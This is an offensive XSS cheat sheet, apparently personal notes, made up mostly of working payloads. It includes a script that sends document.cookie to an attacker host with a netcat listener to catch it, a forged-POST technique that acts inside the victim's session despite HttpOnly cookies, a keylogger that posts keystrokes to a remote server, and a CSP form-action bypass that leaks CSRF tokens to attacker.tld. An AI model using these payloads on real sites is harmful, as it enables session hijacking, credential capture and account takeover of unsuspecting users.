# XSS

## **XSS Cookie Steal**

This works when the url query is DOM loaded in the page

Create a image object in javascript and will be loaded with the output with the document cookie query

```bash
http://localhost:81/DVWA/vulnerabilities/xss_r/?
name=
<script>
new  Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;
</script>
```

**You can catch with a webhook and netcat**

- **Webhook: `webhook.site`**
- **netcat: `nc -lvp 80`**

## Anti-bypass session hijack

I**f the server implements this you can't steal the victim's session**

- When the cookie is set the response request with set-cookie
- When the cookie is HttpOnly

**You can steal the session when the cookie is set on the request of the browser**

**Anti-Anti-bypass the HttpOnly :)**

- If the cookie is HttpOnly you can't steal the cookies but you can execute actions in the account of the user
- If you send a request to the server with the xss script injection the session will be autenticated in the victin browser

**Example:**

```html
<script>
	var xhr = new XMLHttpRequest();
	xhr.open('POST','http://localhost:81/DVWA/vulnerabilities/xss_s/',true);
	xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
	xhr.send('txtName=xss&mtxMessage=xss&btnSign=Sign+Guestbook');
</script>
```

- This script send a POST request and will post a message in the account of the user

## XSS Keylogger

Include this script in another website and import in the XSS attacked site

**`<script src='attackersite'></script>`**

```jsx
var l = "";   // empty string to concatenate keys onto
document.onkeypress = function (e) {
        l += e.key;
        console.log(l);  //Test line
        var req = new XMLHttpRequest();
        req.open("POST","<server goes here>", true); 	// ADD URL HERE!
        req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        req.send("data=" + l);
}
```

## **Bypass form action with Reflected XSS**

**Fucking CSP implementation**

-Work when the action of the form is specified on the URL query

When the victim clicks on the injected button the form will be sent to the attacker webhook on the href in the button

-The attacker can steal the victim's CRSF token

**Example:**

```bash
http://bugbounty.se/csp_bypass.php?
xss=<input value="CLICK ME FOR POC" type="submit" formaction="" form="subscribe" formmethod="get" /><input type="hidden" name="xss" form="subscribe" value="<link rel='subresource' href='http://attacker.tld/link-subresource'>"/>
```

**The values will be sent to: 'http://attacker.tld/link-subresource'**

**Google:**

**`"<link rel = 'subresource' href = ' http: //attacker.tld '>"`**

**Firefox:**

**`"<a href = ' http: //attacker.tld ' > "`**

(The downside being that the user has to click twice times)
